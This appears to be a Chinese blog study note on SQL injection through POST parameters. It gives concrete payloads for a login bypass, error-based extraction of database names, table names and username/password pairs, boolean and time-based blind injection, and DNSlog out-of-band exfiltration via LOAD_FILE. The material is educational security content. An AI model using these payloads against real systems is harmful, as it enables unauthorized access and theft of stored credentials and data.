---
title: SQL注入之POST提交注入
categories:
  - 学习
tags:
  - SQL注入
abbrlink: 99eb0d83
---

### POST提交和GET提交的区别

|      POST提交      |           GET提交            |
| :----------------: | :--------------------------: |
|      不可缓存      |            可缓存            |
| 不可保留在浏览记录 |       可保留在浏览记录       |
|   不可收藏为书签   |         可收藏为书签         |
|    没有长度限制    | 有长度限制（最长2048个字符） |



### POST注入原理

#### **核心漏洞原因**

**用户输入未过滤**：后端直接将用户通过 POST 提交的参数拼接到 SQL 语句中。

**举例**

```sql
#原始SQL
SELECT * FROM users WHERE username='$_POST[username]' AND password='$_POST[password]'
#攻击输入
admin' -- +&&password=123(任意值)
#此时系统的查询语句
SELECT * FROM users WHERE username='admin' -- ' AND password='123'
#注释符 -- 使密码条件失效，直接以 admin 身份登录。
```



### POST提交UNION注入

与GET提交类似

判断闭合符号也类似，用相同的方法即可

参考上方举例

### POST提交报错注入

```sql
获取库名
username= AND extractvalue(1, concat(0x7e, (SELECT database()))) -- &password=123
获取表名
 username= AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) -- &password=123
提取数据
 username= AND extractvalue(1, concat(0x7e, (SELECT group_concat(username, 0x3a, password) FROM users LIMIT 0,1))) -- 


```

### 盲注

#### 布尔盲注

```sql
passwprd=123&uname=aaa' or ascii(substring((select database()),1,1))>=110 #
```

#### 时间盲注

```sql
passwprd=123&uname=aaa' or if(ascii(substring((select database()),1,1))>=110 sleep(0),sleep(2))#查询第一个字符的ascii编码，若查询为真，立即响应，若查询为假，延迟响应
```

#### DNSlog

```sql
[触发DNS的函数](CONCAT('[子域名前缀]', (SELECT 查询语句), '[DNSlog域名]'))

获取库名
uname=adm and (select load_file(concat("//",(select HEX(database()),".DNS路径/1.txt(随意文件名)"))) -- +
再从DNSlog.cn网站获取内容
获取表名
uname=adm and (SELECT LOAD_FILE(CONCAT('//',(SELECT HEX(table_name) FROM information_schema.tables WHERE table_schema='目标库名' LIMIT 0,1),".DNS路径/1.txt(随意文件名)"))) -- 
获取列名
uname=adm AND (SELECT LOAD_FILE(CONCAT('//',(SELECT HEX(column_name) FROM information_schema.columns WHERE table_name='目标表名' AND table_schema='目标库名' LIMIT 0,1),".DNS路径/1.txt(随意文件名)"))) -- 

使用 HEX 编码绕过特殊字符限制（如@，空格）
使用limit 0，1 强制查询返回第一行结果，确保注入语句语法正确
               

```

**注意事项**
权限与配置

MySQL 需启用 secure_file_priv（默认禁用），可通过以下命令检查：
`SHOW VARIABLES LIKE 'secure_file_priv';`
若返回 NULL，需在 my.cnf 中设置 secure_file_priv = '' 并重启服务。

`查询是否可以使用dnslog注入`

`http://example.com?id=1' UNION SELECT 1,@@secure_file_priv,3 -- `
